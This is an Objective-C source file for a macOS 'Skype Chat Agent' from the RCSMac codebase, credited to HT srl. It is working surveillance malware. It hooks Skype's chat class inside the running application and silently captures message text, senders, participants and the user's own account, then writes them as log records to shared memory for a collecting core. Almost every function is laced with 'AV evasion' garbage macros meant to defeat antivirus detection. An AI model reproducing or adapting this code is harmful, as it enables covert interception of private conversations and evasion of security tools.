/*
 * RCSMac - Skype Chat Agent
 * 
 *
 * Created by Alfredo 'revenge' Pesoli on 11/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSMAgentIMSkype.h"
#import "RCSMAgentOrganizer.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

#define INCOMING_CHAT   0x01
#define OUTCOMING_CHAT  0x00

static BOOL gIsSkype2 = YES;
static BOOL gSkypeContactGrabbed = NO;

void logSkypeContacts(NSString *contact)
{  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *firstData   = [@"Skype" dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
  NSData *contactData = [contact dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
  
  NSMutableData *abData       = [[NSMutableData alloc] init];
  
  u_int tag = 0x1 << 24; // firstName
  tag |= ([firstData length] & 0x00FFFFFF);
  
  [abData appendBytes:&tag length:sizeof(u_int)];
  
  [abData appendData:firstData];
  tag = 0x6 << 24; // email address
  tag |= ([contactData length] & 0x00FFFFFF);
  
  [abData appendBytes:&tag length:sizeof(u_int)];
  [abData appendData:contactData];
  
  NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(organizerAdditionalHeader)];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  additionalHeader->size    = sizeof(organizerAdditionalHeader) + [abData length];
  additionalHeader->version = CONTACT_LOG_VERSION_NEW;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  additionalHeader->identifier  = 0;
  additionalHeader->program     = 0x02; // skype contact
  additionalHeader->flags       = 0x80000000; // non local (local = 0x80000000)
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSMutableData *entryData    = [[NSMutableData alloc] init];
  
  [entryData appendData:logHeader];
  [entryData appendData:abData];
  
  [logHeader release];
  [abData release];
  
  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_CHAT_CONTACT;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
  {
#ifdef DEBUG_IM_SKYPE
    verboseLog(@"message: %@", loggedText);
#endif
  }
  else
  {
#ifdef DEBUG_IM_SKYPE
    errorLog(@"Error while logging skype message to shared memory");
#endif
  }
  
  [logData release];
  
  gSkypeContactGrabbed = TRUE;
}

@implementation __m_mySkypeChat

- (BOOL)isMessageRecentlyDisplayedHook: (uint)arg1
{ 
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  BOOL success  = [self isMessageRecentlyDisplayedHook: arg1];
  id message    = nil;
  int a=0;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([self respondsToSelector: @selector(getChatMessageWithObjectID:)])
    {      
      // AV evasion: only on release build
      AV_GARBAGE_006

      SEL sel = @selector(getChatMessageWithObjectID:);
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      NSMethodSignature *signature = [self methodSignatureForSelector: sel]; 
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      NSInvocation *invocation     = [NSInvocation invocationWithMethodSignature: signature];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      [invocation setTarget: self];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      [invocation setSelector: sel];
      [invocation setArgument: &arg1 atIndex: 2];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [invocation invoke];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      [invocation getReturnValue: &message];
    }
  else
    {
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      return success;
    }

  if (message == nil)
    {      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      return success;
    }
  
  a++;
  
  int programType = 0x01; // skype
  int flags; // 0x01 = chat incoming
  
  NSArray         *_activeMembers;
  NSMutableString *activeMembers  = [[NSMutableString alloc] init];
  NSMutableString *loggedText     = [[NSMutableString alloc] init];
  NSString        *myAccount = @"";
  NSString        *fromUser  = @"";
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (message != nil)
    {
      if ([self respondsToSelector: @selector(activeMemberHandles)]) // Skype < 2.8.0.722
        { 
          // AV evasion: only on release build
          AV_GARBAGE_004
        
          _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(activeMemberHandles)]];
          
          // AV evasion: only on release build
          AV_GARBAGE_006
        }
      else if ([self respondsToSelector: @selector(posterHandles)]) // Skype 2.8.0.722
        { 
          // AV evasion: only on release build
          AV_GARBAGE_005
        
          _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(posterHandles)]];
          
          // AV evasion: only on release build
            
        }
      else if ([self respondsToSelector: @selector(memberContacts)]) // Skype 5.0.0.7994
        { 
          // AV evasion: only on release build
          AV_GARBAGE_008
        
          _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(memberContacts)]]; 
          
          // AV evasion: only on release build
          AV_GARBAGE_000
        
          gIsSkype2 = NO;
          
          // AV evasion: only on release build
          AV_GARBAGE_003
        }
      else
        {
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          _activeMembers = [NSArray arrayWithObject: @"EMPTY"];
        }
      
      a++;
      
      if ([message body] != NULL)
        { 
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          MacContact *fromContact = [message fromUser];
          
          if (fromContact != nil)
            fromUser = (NSString*)[fromContact identity];

          int x;
          
          //
          // In Skype 5 we don't have ourself inside the chat members list
          //
          if (gIsSkype2 == NO)
          {
            id myself = [self performSelector: @selector(myMemberContact)];
            
            // AV evasion: only on release build
            AV_GARBAGE_008
           
            myAccount = (NSString*)[myself identity];
            
            if (gSkypeContactGrabbed == FALSE)
              logSkypeContacts(myAccount);
          }
          
          if ([fromUser compare: myAccount] == NSOrderedSame)
          {
            flags = OUTCOMING_CHAT;
          }
          else
          {
            flags = INCOMING_CHAT;
            
            [activeMembers appendString: myAccount];
          }
          
          for (x = 0; x < [_activeMembers count]; x++)
          {
            // AV evasion: only on release build
            AV_GARBAGE_000
            
            id entry = [_activeMembers objectAtIndex: x];
            
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            if ([entry isKindOfClass: [NSString class]])
            {
              // AV evasion: only on release build
              AV_GARBAGE_001

              if ([activeMembers length] > 0)
                [activeMembers appendString: @", "];
              
              // Skype 2.x NSString entries
              [activeMembers appendString: entry];
              
              // AV evasion: only on release build
              AV_GARBAGE_003
            }
            else
            {
              // AV evasion: only on release build
              AV_GARBAGE_006
              if ([activeMembers length] > 0)
                [activeMembers appendString: @", "];
              
              // Skype 5.x SkypeChatContact entries
              [activeMembers appendString: [entry performSelector: @selector(identity)]];
                 
              // AV evasion: only on release build
              AV_GARBAGE_006
            }
            
            // AV evasion: only on release build
            AV_GARBAGE_006
          }
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          // Appending the message body
          [loggedText appendString: [message body]];
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
        }
      else
        {
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          return success;
        }
      a--;
    }
  else
    {
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      a--;
      return success;
    }

  // Start logging
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData    = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  //
  if (sizeof(long) == 4) // 32bit
    { 
      // AV evasion: only on release build
      AV_GARBAGE_006
    
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    { 
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
  
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSData *topic = [fromUser dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
  NSData *peers = [activeMembers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  NSData *content             = [loggedText dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  // Program type
  [entryData appendBytes:&programType length:sizeof(programType)];
  
  // flags
  [entryData appendBytes:&flags length:sizeof(flags)];
  
  // Topic
  [entryData appendData: topic];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Topic_display
  [entryData appendData: topic];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Peers
  [entryData appendData: peers];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Peers_display
  [entryData appendData: peers];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Content
  [entryData appendData: content]; 
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_CHAT_NEW;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  // AV evasion: only on release build
  AV_GARBAGE_002  
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_IM_SKYPE
      verboseLog(@"message: %@", loggedText);
#endif
    }
  else
    {
#ifdef DEBUG_IM_SKYPE
      errorLog(@"Error while logging skype message to shared memory");
#endif
    }
  
  [activeMembers release];
  [loggedText release];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [logData release];
  [entryData release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return success;
}

@end
